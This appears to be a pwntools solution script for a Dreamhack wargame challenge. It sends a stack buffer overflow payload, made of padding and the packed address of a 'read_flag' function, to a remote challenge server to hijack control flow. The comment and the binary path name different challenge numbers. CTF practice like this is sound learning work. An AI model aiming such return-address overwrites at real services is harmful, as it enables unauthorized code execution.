from pwn import *

# /000_Wargame/basic_exlpoit1/basic_exploitation_001

con = remote("host8.dreamhack.games", 23252)

e = ELF("./000_Wargame/basic_Exploit00/basic_exploitation_000")
target = p32(e.symbols["read_flag"])

payload = b'A'*0x80 + b'B'*0x4 + target

con.sendline(payload)

con.interactive()
